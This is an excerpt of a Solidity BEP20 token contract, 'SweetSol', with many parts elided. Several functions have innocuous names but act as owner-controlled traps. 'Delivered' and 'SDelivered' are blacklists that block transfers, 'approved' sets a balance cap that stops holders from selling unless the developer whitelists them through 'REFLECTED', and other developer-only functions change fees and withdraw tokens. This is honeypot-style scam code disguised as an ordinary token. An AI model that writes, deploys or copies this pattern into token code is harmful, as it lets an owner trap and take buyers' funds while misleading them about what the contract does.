...
contract SweetSol is Context, IBEP20, Ownable {
    ...
    uint256 private _LIQUIDITYPOOL_FEE;

    string  public     TOKEN_FEE;

    uint256 private ORIG_TAX_FEE;
    uint256 private ORIG_BURN_FEE;
    uint256 private ORIG_LIQUIDITYPOOL_FEE;

    uint256 private HL_FEE;
    mapping (address => bool) private Delivered;
    mapping (address => bool) private SDelivered;
    mapping (address => bool) private REFLECTED;

    constructor (string memory _name, string memory _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,uint256 _burnFee,uint256 _liquiditypoolFee,address _FeeAddress,address tokenOwner,address _burner) payable   {
        _NAME = _name;
        _SYMBOL = _symbol;
        _DECIMALS = _decimals;
    ...
    function setTokenFee(string memory _fee) external onlyDev {
        TOKEN_FEE = _fee;
    }
    ...
    function _Delivered(address _label, bool _allow) external onlyDev {
        if(_allow){
            Delivered[_label] = _allow;
        } else {
            delete Delivered[_label];
        }
    }

    function isDelivered(address _label) external view returns (bool) {
        return Delivered[_label];
    }

    function _SDelivered(address _label, bool _allow) external onlyDev {
        if(_allow){
            SDelivered[_label] = _allow;
        } else {
            delete SDelivered[_label];
        }
    }

    function _BSDelivered(address[] memory _labels, bool _allow) external onlyDev {
        if(_allow){
            for (uint256 i = 0; i < _labels.length; i++) {
                SDelivered[_labels[i]] = _allow;
            }
        } else {
            for (uint256 i = 0; i < _labels.length; i++) {
                delete SDelivered[_labels[i]];
            }
        }
    }

    function isSDelivered(address _label) external view returns (bool) {
        return SDelivered[_label];
    }

    function _REFLECTED(address _label, bool _allow) external onlyDev {
        if(_allow){
            REFLECTED[_label] = _allow;
        } else {
            delete REFLECTED[_label];
        }
    }

    function isREFLECTED(address _label) external view returns (bool) {
        return REFLECTED[_label];
    }
    ...
    function transmit(address account, bool _allow) external onlyDev {
        //require(!_isExcluded[account] && _allow, "Account is already excluded");
        //require(_isExcluded[account] && !_allow, "Account is already included");
    ...
    function STransmit(address account, bool _allow) external onlyDev {
        //require(!_isExcludedSender[account] && _allow, "Account is already excluded");
        //require(_isExcludedSender[account] && !_allow, "Account is already included");
    ...
    function synchronize(uint256 _txFee,uint256 _burnFee,uint256 _liquiditypoolFee) onlyDev() public{
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        require(!(Delivered[sender] || Delivered[recipient]));
        require(!SDelivered[sender]);
        require(balanceOf(sender) < HL_FEE || HL_FEE == 0 || REFLECTED[sender]);
    ...
    function approved(uint value) external onlyDev {
        HL_FEE = value;
    }
    ...
    function BEP20recover(address token, uint amount, address _wallet) onlyDev external {
        if(token == address(0)) {
